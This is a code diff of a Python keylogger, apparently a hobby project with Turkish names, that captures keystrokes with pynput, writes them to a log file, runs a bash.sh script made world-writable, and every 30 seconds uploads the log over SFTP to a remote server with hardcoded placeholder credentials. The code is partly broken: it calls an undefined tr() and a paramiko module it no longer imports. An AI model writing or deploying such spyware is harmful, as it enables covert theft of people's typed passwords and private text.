@@ -1,6 +1,7 @@
-import paramiko
+from paramiko import SSHClient, AutoAddPolicy, RSAKey
+from paramiko.auth_handler import AuthenticationException, SSHException
 import os
-import  time
+import time
 from pynput.keyboard import Key,Listener
 
 count=0
@@ -31,29 +32,24 @@ def write_file(keys):
 def on_release(key):
     if key==Key.esc:
         return False
+		
+def gonder_abisi(dosya,kayityeri):
+	ssh = paramiko.SSHClient()
+	ssh.load_host_keys(os.path.expanduser(os.path.join("~", ".ssh", "known_hosts")))
+	ssh.connect("sunucuadi", username="kullaniciadi", password="sifre")
+	sftp = ssh.open_sftp()
+	sftp.put(dosya, kayityeri)
+	sftp.close()
+	ssh.close()
 
 with Listener(on_press=on_press, on_release=on_release) as listenner:
     listenner.join()
 
 os.system("chmod 777 bash.sh")
-os.system("./bash.sh") #gerekli dosyaları yükledfgf
+os.system("./bash.sh") #gerekli dosyalarÄ± yÃ¼kledfgf
 
 
 starttime = time.time()
 while True:
-
-
-    client = paramiko.SSHClient()
-    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-
-    client.connect('ip adress', username='<User Name>', password='', key_filename='<.PEM File path')
-
-    # Setup sftp connection and transmit this script
-    print("copying")
-
-    sftp = client.open_sftp()
-    sftp.put( "< Source >," " < Destination >")
-
-
-    sftp.close()
-    time.sleep(30.0 - ((time.time() - starttime) % 30.0))
+	gonder_abisi("log.txt","/root/kayitlar/log"+tr(time.time())+".txt")
+	time.sleep(30.0 - ((time.time() - starttime) % 30.0))
